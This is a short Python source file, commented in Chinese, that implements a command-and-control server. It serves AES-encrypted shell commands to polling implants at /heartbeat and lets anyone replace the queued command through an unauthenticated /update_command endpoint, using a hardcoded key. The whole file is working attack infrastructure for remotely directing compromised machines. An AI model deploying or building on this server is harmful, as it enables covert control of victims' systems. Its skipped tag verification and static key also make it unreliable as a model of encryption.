from http.server import BaseHTTPRequestHandler, HTTPServer
from Crypto.Cipher import AES
import base64
import urllib.parse

# AES加密和解密函数
def encrypt(message, key):
    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext, tag = cipher.encrypt_and_digest(message.encode())
    return base64.b64encode(nonce + ciphertext).decode()

def decrypt(ciphertext, key):
    raw_data = base64.b64decode(ciphertext)
    nonce = raw_data[:16]
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    plaintext = cipher.decrypt(raw_data[16:])
    return plaintext.decode()

class C2ServerHandler(BaseHTTPRequestHandler):
    command_to_execute = "echo Hello, World!"  # 默认命令
    encryption_key = b'0123456789abcdef'  # 16字节AES密钥

    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed_path.query)

        # 处理接收客户端的心跳请求
        if parsed_path.path == '/heartbeat':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            encrypted_command = encrypt(C2ServerHandler.command_to_execute, C2ServerHandler.encryption_key)
            self.wfile.write(encrypted_command.encode())
        # 处理更新命令请求
        elif parsed_path.path == '/update_command' and 'cmd' in query:
            C2ServerHandler.command_to_execute = query['cmd'][0]
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Command updated')
        else:
            self.send_response(404)
            self.end_headers()

def run(server_class=HTTPServer, handler_class=C2ServerHandler, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting C2 server on port {port}')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
